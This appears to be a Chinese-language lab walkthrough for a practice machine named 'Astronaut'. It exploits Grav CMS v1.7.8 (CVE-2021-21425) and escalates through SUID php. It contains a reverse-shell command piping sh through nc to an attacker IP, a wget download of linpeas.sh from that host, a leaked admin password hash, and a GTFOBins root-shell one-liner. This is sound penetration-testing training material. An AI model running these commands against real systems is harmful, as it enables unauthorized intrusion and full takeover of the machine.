---
description: Easy - Linux / grav CMS v1.7.8 / php 7.4 SUID提权 / CVE-2021-21425
---

# ✔️ Astronaut

## 建立立足点

### 信息收集

* 使用Nmap对目标系统的开放端口进行扫描，获取到2个开放端口：22和80

```bash
nmap -sC -sV -oA astronaut 192.168.235.12 --open
```

<figure><img src="../../.gitbook/assets/1 (35).png" alt=""><figcaption></figcaption></figure>

* 先检查80端口上的内容，发现是一个Apache的默认页面，其中有一个/grav-admin目录：

<figure><img src="../../.gitbook/assets/2 (33).png" alt=""><figcaption></figcaption></figure>

* 检查robots.txt文件，也发现了一些隐藏目录：

<figure><img src="../../.gitbook/assets/3 (30).png" alt=""><figcaption></figcaption></figure>

* 枚举80端口上的隐藏文件/目录，找到了登录入口，尝试弱口令登录失败：

<figure><img src="../../.gitbook/assets/4 (31).png" alt=""><figcaption></figcaption></figure>

### 漏洞查阅

* 虽然无法登录，但已得知目标系统正在使用的是Grav CMS,可以直接尝试搜索相关漏洞：

<figure><img src="../../.gitbook/assets/5 (31).png" alt=""><figcaption></figcaption></figure>

* 发现有一个不用登录即可利用的任意yaml文件写入/升级的漏洞：

<figure><img src="../../.gitbook/assets/6 (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/12 (28).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

* 执行该脚本的命令：

```bash
python3 exploit.py -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.159 6666 >/tmp/f' -t http://192.168.235.12/grav-admin
# kali：
nc -lvnp 6666
```

<figure><img src="../../.gitbook/assets/20 (18).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/7 (31).png" alt=""><figcaption></figcaption></figure>

### Get Shell

* 获取到基本立足点：

<figure><img src="../../.gitbook/assets/8 (31).png" alt=""><figcaption></figcaption></figure>

* 升级到交互shell：

```bash
python3 -c 'import pty;pty.sapwn("/bin/bash")'
```

<figure><img src="../../.gitbook/assets/9 (30).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息收集

* 在本地信息枚举的过程中，发现一个admin.yaml文件，其中包含了admin账户的哈希密码以及其他关于admin账户的信息：
  * `admin :$2y$10$dlTNg17RfN4pkRctRm1m2u8cfTHHz7Im.m61AYB9UtLGL2PhlJwe.`
  * admin@gravity.com

<figure><img src="../../.gitbook/assets/10 (32).png" alt=""><figcaption></figcaption></figure>

* 在security.yaml文件中，发现了一个貌似是有效凭证的信息：**salt : IJQxNdg2BPKhvp**

<figure><img src="../../.gitbook/assets/11 (29).png" alt=""><figcaption></figcaption></figure>

* 在versions.yaml文件中，发现当前grav CMS的详细版本号：**v1.7.8**

<figure><img src="../../.gitbook/assets/13 (29).png" alt=""><figcaption></figcaption></figure>

* 上传linpeas.sh进行信息收集：

```bash
# kali:
python3 -m http.server
# target:
wget http://192.168.45.159:8000/linpeas.sh
```

<figure><img src="../../.gitbook/assets/14 (26).png" alt=""><figcaption></figcaption></figure>

### 漏洞利用

* 从linpeas.sh的输出结果中发现，有可利用的SUID程序：**php 7.4**

<figure><img src="../../.gitbook/assets/15 (25).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/16 (24).png" alt=""><figcaption></figcaption></figure>

### ROOT

* 在gtfobins中查询到了命令：

```bash
CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);"
```

<figure><img src="../../.gitbook/assets/17 (22).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/18 (21).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/19 (22).png" alt=""><figcaption></figcaption></figure>
